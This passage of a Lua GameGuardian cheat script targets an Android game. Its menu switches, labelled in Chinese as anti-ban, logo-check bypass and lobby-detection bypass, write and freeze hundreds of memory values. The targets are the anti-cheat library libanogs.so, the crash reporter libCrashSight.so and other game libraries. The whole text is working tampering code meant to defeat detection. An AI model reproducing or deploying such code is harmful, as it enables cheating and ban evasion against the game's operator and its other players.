Modify(Read('libxero.so','rw-p')+0xdf04,800,4)
Modify(Read('libxero.so','rw-p')+0xdf08,800,4)
Modify(Read('libxero.so','rw-p')+0xdf0c,800,4)
Modify(Read('libxero.so','rw-p')+0xdf10,800,4)
Modify(Read('libxero.so','rw-p')+0xdf14,800,4)
Modify(Read('libxero.so','rw-p')+0xdf18,800,4)
Modify(Read('libxero.so','rw-p')+0xdf1c,800,4)
Modify(Read('libxero.so','rw-p')+0xdf20,800,4)
Modify(Read('libxero.so','rw-p')+0xdf24,800,4)
Modify(Read('libxero.so','rw-p')+0xdf28,800,4)
Modify(Read('libxero.so','rw-p')+0xdf2c,800,4)
Modify(Read('libxero.so','rw-p')+0xdf30,800,4)
Modify(Read('libxero.so','rw-p')+0xdf34,800,4)
Modify(Read('libxero.so','rw-p')+0xdf38,800,4)
Modify(Read('libxero.so','rw-p')+0xdf3c,800,4)
Modify(Read('libxero.so','rw-p')+0xdf40,800,4)
Modify(Read('libxero.so','rw-p')+0xdf44,800,4)
Modify(Read('libxero.so','rw-p')+0xdf48,800,4)
Modify(Read('libxero.so','rw-p')+0xdf4c,800,4)
Modify(Read('libxero.so','rw-p')+0xdf50,800,4)
Modify(Read('libxero.so','rw-p')+0xdf54,800,4)
Modify(Read('libxero.so','rw-p')+0xdf58,800,4)
Modify(Read('libxero.so','rw-p')+0xdf5c,800,4)
Modify(Read('libxero.so','rw-p')+0xdf60,800,4)
Modify(Read('libxero.so','rw-p')+0xdf64,800,4)
Modify(Read('libxero.so','rw-p')+0xdf68,800,4)
Modify(Read('libxero.so','rw-p')+0xdf6c,800,4)
Modify(Read('libxero.so','rw-p')+0xdf70,800,4)
Modify(Read('libxero.so','rw-p')+0xdf74,800,4)
Modify(Read('libxero.so','rw-p')+0xdf78,800,4)
Modify(Read('libxero.so','rw-p')+0xdf7c,800,4)
Modify(Read('libxero.so','rw-p')+0xdf80,800,4)
Modify(Read('libxero.so','rw-p')+0xdf84,800,4)
Modify(Read('libxero.so','rw-p')+0xdf88,800,4)
Modify(Read('libxero.so','rw-p')+0xdf8c,800,4)
Modify(Read('libxero.so','rw-p')+0xdf90,800,4)
Modify(Read('libxero.so','rw-p')+0xdf94,800,4)
Modify(Read('libxero.so','rw-p')+0xdf98,800,4)
Modify(Read('libxero.so','rw-p')+0xdf9c,800,4)
Modify(Read('libxero.so','rw-p')+0xdfa0,800,4)
Modify(Read('libxero.so','rw-p')+0xdfa4,800,4)
Modify(Read('libxero.so','rw-p')+0xdfa8,800,4)
Modify(Read('libxero.so','rw-p')+0xdfac,800,4)
Modify(Read('libxero.so','rw-p')+0xdfb0,800,4)
Modify(Read('libxero.so','rw-p')+0xdfb4,800,4)
Modify(Read('libxero.so','rw-p')+0xdfb8,800,4)
Modify(Read('libxero.so','rw-p')+0xdfbc,800,4)
Modify(Read('libxero.so','rw-p')+0xdfc0,800,4)
Modify(Read('libxero.so','rw-p')+0xdfc4,800,4)
Modify(Read('libxero.so','rw-p')+0xdfc8,800,4)
Modify(Read('libxero.so','rw-p')+0xdfcc,800,4)
Modify(Read('libxero.so','rw-p')+0xdfd0,800,4)
Modify(Read('libxero.so','rw-p')+0xdfd4,800,4)
Modify(Read('libxero.so','rw-p')+0xdfd8,800,4)
Modify(Read('libxero.so','rw-p')+0xdfdc,800,4)
Modify(Read('libxero.so','rw-p')+0xdfe0,800,4)
Modify(Read('libxero.so','rw-p')+0xdfe4,800,4)
Modify(Read('libxero.so','rw-p')+0xdfe8,800,4)
Modify(Read('libxero.so','rw-p')+0xdfec,800,4)
Modify(Read('libxero.so','rw-p')+0xdff0,800,4)
Modify(Read('libxero.so','rw-p')+0xdff4,800,4)
Modify(Read('libxero.so','rw-p')+0xdff8,800,4)
Modify(Read('libxero.so','rw-p')+0xdffc,800,4)
gg.setValues(Table)
string.toMusic('开启成功')
end),		
changan.text("防封专区","#00FF00","10sp"),--空文本可用于换行，sp调整距离
changan.switch("LOGO防闪退",
function()	
gg.loopKillGG()-----杀GG
local t = {"libanogs.so:bss", "Cb"}
local tt = {0x9C8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 4096, freeze = true}})
string.toMusic('开启成功')
end),
changan.switch("LOGO过检测",
function()	
gg.loopKillGG()-----杀GG
if gg.getRangesList("libUE4.so")[1] then
	local t = {}
	t[1] = gg.getRangesList("libUE4.so")[1]["start"] + 0x0; -- 数值地址:0x7643A3C000
	t[2] = gg.getRangesList("libUE4.so")[1]["start"] + 0x4; -- 数值地址:0x7643A3C004
	gg.addListItems({
		[1] = { 
			address = t[1],
			flags = 4,
			value = -698416192,
			freeze = true,
		},
		[2] = { 
			address = t[2],
			flags = 4,
			value = -698416192,
			freeze = true,
		},
	})
	gg.toast("开启成功")
end
if gg.getRangesList("libanogs.so")[1] then
	local t = {}
	t[1] = gg.getRangesList("libanogs.so")[1]["start"] + 0x4E7970; -- 数值地址:0x7659EEF970
	t[2] = gg.getRangesList("libanogs.so")[1]["start"] + 0x4E7974; -- 数值地址:0x7659EEF974
	gg.addListItems({
		[1] = { 
			address = t[1],
			flags = 4,
			value = -698416192,
			freeze = true,
		},
		[2] = { 
			address = t[2],
			flags = 4,
			value = -698416192,
			freeze = true,
		},
	})
string.toMusic('开启成功')
end
end),
changan.switch("大厅过检测",
function()	
gg.loopKillGG()-----杀GG
local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0xE40, 0x10, 0x8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0xE40, 0x10, 0xA0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0xE40, 0x10, 0xD8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1890, 0x10, 0x28}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1890, 0x10, 0x18}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1890, 0x10, 0x0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1890, 0x10, 0x8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1890, 0x10, 0xA0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1890, 0x10, 0xD8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A30, 0x10, 0x28}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A30, 0x10, 0x18}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A30, 0x10, 0x0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A30, 0x10, 0x8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A30, 0x10, 0xA0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A30, 0x10, 0xD8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A50, 0x10, 0x28}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A50, 0x10, 0x18}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A50, 0x10, 0x0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A50, 0x10, 0x8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A50, 0x10, 0xA0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0x1A50, 0x10, 0xD8}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libCrashSight.so:bss", "Cb"}
local tt = {0x6340, 0x40, 0x88}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libCrashSight.so:bss", "Cb"}
local tt = {0x6340, 0x40, 0x78}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0xE40, 0x10, 0x28}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0xE40, 0x10, 0x18}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})

local t = {"libc++_shared.so:bss", "Cb"}
local tt = {0xE40, 0x10, 0x0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 33321, freeze = true}})
if gg.getRangesList("libanogs.so")[1] then
	local t = {}
	t[1] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2048; -- 数值地址:0x76511C4048
	t[2] = gg.getRangesList("libanogs.so")[1]["start"] + 0x204C; -- 数值地址:0x76511C404C
	t[3] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2050; -- 数值地址:0x76511C4050
	t[4] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2054; -- 数值地址:0x76511C4054
	t[5] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2058; -- 数值地址:0x76511C4058
	t[6] = gg.getRangesList("libanogs.so")[1]["start"] + 0x205C; -- 数值地址:0x76511C405C
	t[7] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2060; -- 数值地址:0x76511C4060
	t[8] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2064; -- 数值地址:0x76511C4064
	t[9] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2068; -- 数值地址:0x76511C4068
	t[10] = gg.getRangesList("libanogs.so")[1]["start"] + 0x206C; -- 数值地址:0x76511C406C
	t[11] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2070; -- 数值地址:0x76511C4070
	t[12] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2074; -- 数值地址:0x76511C4074
	t[13] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2078; -- 数值地址:0x76511C4078
	t[14] = gg.getRangesList("libanogs.so")[1]["start"] + 0x207C; -- 数值地址:0x76511C407C
	t[15] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2080; -- 数值地址:0x76511C4080
	t[16] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2084; -- 数值地址:0x76511C4084
	t[17] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2088; -- 数值地址:0x76511C4088
	t[18] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2090; -- 数值地址:0x76511C4090
	t[19] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2094; -- 数值地址:0x76511C4094
	t[20] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2098; -- 数值地址:0x76511C4098
	t[21] = gg.getRangesList("libanogs.so")[1]["start"] + 0x209C; -- 数值地址:0x76511C409C
	t[22] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20A0; -- 数值地址:0x76511C40A0
	t[23] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20A8; -- 数值地址:0x76511C40A8
	t[24] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20AC; -- 数值地址:0x76511C40AC
	t[25] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20B0; -- 数值地址:0x76511C40B0
	t[26] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20B4; -- 数值地址:0x76511C40B4
	t[27] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20B8; -- 数值地址:0x76511C40B8
	t[28] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20BC; -- 数值地址:0x76511C40BC
	t[29] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20C0; -- 数值地址:0x76511C40C0
	t[30] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20C4; -- 数值地址:0x76511C40C4
	t[31] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20C8; -- 数值地址:0x76511C40C8
	t[32] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20CC; -- 数值地址:0x76511C40CC
	t[33] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20D0; -- 数值地址:0x76511C40D0
	t[34] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20D4; -- 数值地址:0x76511C40D4
	t[35] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20D8; -- 数值地址:0x76511C40D8
	t[36] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20DC; -- 数值地址:0x76511C40DC
	t[37] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20E0; -- 数值地址:0x76511C40E0
	t[38] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20E4; -- 数值地址:0x76511C40E4
	t[39] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20E8; -- 数值地址:0x76511C40E8
	t[40] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20EC; -- 数值地址:0x76511C40EC
	t[41] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20F0; -- 数值地址:0x76511C40F0
	t[42] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20F4; -- 数值地址:0x76511C40F4
	t[43] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20F8; -- 数值地址:0x76511C40F8
	t[44] = gg.getRangesList("libanogs.so")[1]["start"] + 0x20FC; -- 数值地址:0x76511C40FC
	t[45] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2100; -- 数值地址:0x76511C4100
	t[46] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2104; -- 数值地址:0x76511C4104
	t[47] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2108; -- 数值地址:0x76511C4108
	t[48] = gg.getRangesList("libanogs.so")[1]["start"] + 0x210C; -- 数值地址:0x76511C410C
	t[49] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2110; -- 数值地址:0x76511C4110
	t[50] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2114; -- 数值地址:0x76511C4114
	t[51] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2118; -- 数值地址:0x76511C4118
	t[52] = gg.getRangesList("libanogs.so")[1]["start"] + 0x211C; -- 数值地址:0x76511C411C
	t[53] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2120; -- 数值地址:0x76511C4120
	t[54] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2124; -- 数值地址:0x76511C4124
	t[55] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2128; -- 数值地址:0x76511C4128
	t[56] = gg.getRangesList("libanogs.so")[1]["start"] + 0x212C; -- 数值地址:0x76511C412C
	t[57] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2130; -- 数值地址:0x76511C4130
	t[58] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2134; -- 数值地址:0x76511C4134
	t[59] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2138; -- 数值地址:0x76511C4138
	t[60] = gg.getRangesList("libanogs.so")[1]["start"] + 0x213C; -- 数值地址:0x76511C413C
	t[61] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2140; -- 数值地址:0x76511C4140
	t[62] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2144; -- 数值地址:0x76511C4144
	t[63] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2148; -- 数值地址:0x76511C4148
	t[64] = gg.getRangesList("libanogs.so")[1]["start"] + 0x214C; -- 数值地址:0x76511C414C
	t[65] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2150; -- 数值地址:0x76511C4150
	t[66] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2154; -- 数值地址:0x76511C4154
	t[67] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2158; -- 数值地址:0x76511C4158
	t[68] = gg.getRangesList("libanogs.so")[1]["start"] + 0x215C; -- 数值地址:0x76511C415C
	t[69] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2160; -- 数值地址:0x76511C4160
	t[70] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2164; -- 数值地址:0x76511C4164
	t[71] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2168; -- 数值地址:0x76511C4168
	t[72] = gg.getRangesList("libanogs.so")[1]["start"] + 0x216C; -- 数值地址:0x76511C416C
	t[73] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2170; -- 数值地址:0x76511C4170
	t[74] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2174; -- 数值地址:0x76511C4174
	t[75] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2178; -- 数值地址:0x76511C4178
	t[76] = gg.getRangesList("libanogs.so")[1]["start"] + 0x217C; -- 数值地址:0x76511C417C
	t[77] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2180; -- 数值地址:0x76511C4180
	t[78] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2184; -- 数值地址:0x76511C4184
	t[79] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2188; -- 数值地址:0x76511C4188
	t[80] = gg.getRangesList("libanogs.so")[1]["start"] + 0x218C; -- 数值地址:0x76511C418C
	t[81] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2190; -- 数值地址:0x76511C4190
	t[82] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2194; -- 数值地址:0x76511C4194
	t[83] = gg.getRangesList("libanogs.so")[1]["start"] + 0x2198; -- 数值地址:0x76511C4198
	t[84] = gg.getRangesList("libanogs.so")[1]["start"] + 0x219C; -- 数值地址:0x76511C419C
	t[85] = gg.getRangesList("libanogs.so")[1]["start"] + 0x21A0; -- 数值地址:0x76511C41A0
	t[86] = gg.getRangesList("libanogs.so")[1]["start"] + 0x21A4; -- 数值地址:0x76511C41A4
	t[87] = gg.getRangesList("libanogs.so")[1]["start"] + 0x21A8; -- 数值地址:0x76511C41A8
	t[88] = gg.getRangesList("libanogs.so")[1]["start"] + 0x21AC; -- 数值地址:0x76511C41AC
	gg.addListItems({
		[1] = { 
			address = t[1],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[2] = { 
			address = t[2],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[3] = { 
			address = t[3],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[4] = { 
			address = t[4],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[5] = { 
			address = t[5],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[6] = { 
			address = t[6],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[7] = { 
			address = t[7],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[8] = { 
			address = t[8],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[9] = { 
			address = t[9],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[10] = { 
			address = t[10],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[11] = { 
			address = t[11],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[12] = { 
			address = t[12],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[13] = { 
			address = t[13],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[14] = { 
			address = t[14],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[15] = { 
			address = t[15],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[16] = { 
			address = t[16],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[17] = { 
			address = t[17],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[18] = { 
			address = t[18],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[19] = { 
			address = t[19],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[20] = { 
			address = t[20],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[21] = { 
			address = t[21],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[22] = { 
			address = t[22],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[23] = { 
			address = t[23],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[24] = { 
			address = t[24],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[25] = { 
			address = t[25],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[26] = { 
			address = t[26],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[27] = { 
			address = t[27],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[28] = { 
			address = t[28],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[29] = { 
			address = t[29],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[30] = { 
			address = t[30],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[31] = { 
			address = t[31],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[32] = { 
			address = t[32],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[33] = { 
			address = t[33],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[34] = { 
			address = t[34],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[35] = { 
			address = t[35],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[36] = { 
			address = t[36],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[37] = { 
			address = t[37],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[38] = { 
			address = t[38],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[39] = { 
			address = t[39],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[40] = { 
			address = t[40],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[41] = { 
			address = t[41],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[42] = { 
			address = t[42],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[43] = { 
			address = t[43],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[44] = { 
			address = t[44],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[45] = { 
			address = t[45],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[46] = { 
			address = t[46],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[47] = { 
			address = t[47],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[48] = { 
			address = t[48],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[49] = { 
			address = t[49],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[50] = { 
			address = t[50],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[51] = { 
			address = t[51],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[52] = { 
			address = t[52],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[53] = { 
			address = t[53],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[54] = { 
			address = t[54],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[55] = { 
			address = t[55],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[56] = { 
			address = t[56],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[57] = { 
			address = t[57],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[58] = { 
			address = t[58],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[59] = { 
			address = t[59],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[60] = { 
			address = t[60],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[61] = { 
			address = t[61],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[62] = { 
			address = t[62],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[63] = { 
			address = t[63],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[64] = { 
			address = t[64],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[65] = { 
			address = t[65],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[66] = { 
			address = t[66],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[67] = { 
			address = t[67],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[68] = { 
			address = t[68],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[69] = { 
			address = t[69],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[70] = { 
			address = t[70],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[71] = { 
			address = t[71],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[72] = { 
			address = t[72],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[73] = { 
			address = t[73],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[74] = { 
			address = t[74],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[75] = { 
			address = t[75],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[76] = { 
			address = t[76],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[77] = { 
			address = t[77],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[78] = { 
			address = t[78],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[79] = { 
			address = t[79],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[80] = { 
			address = t[80],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[81] = { 
			address = t[81],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[82] = { 
			address = t[82],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[83] = { 
			address = t[83],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[84] = { 
			address = t[84],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[85] = { 
			address = t[85],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[86] = { 
			address = t[86],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[87] = { 
			address = t[87],
			flags = 4,
			value = 17025,
			freeze = true,
		},
		[88] = { 
			address = t[88],
			flags = 4,
			value = 17025,
			freeze = true,
		},
	})
string.toMusic('开启成功')
end
end),
changan.switch("大厅第一套",
function()	
gg.loopKillGG()-----杀GG
local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B476C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B47A4}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B47E4}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B482C}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B4860}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B48A0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B48EC}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B4958}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B4B64}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B4BF0}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B4C30}
local ttt = S_Pointer(t, tt, true)
gg.addListItems({{address = ttt, flags = 4, value = 0, freeze = true}})

local t = {"libgcloud.so:bss", "Cb"}
local tt = {0xFFFFFF918F3B4C84}
local ttt = S_Pointer(t, tt, true)
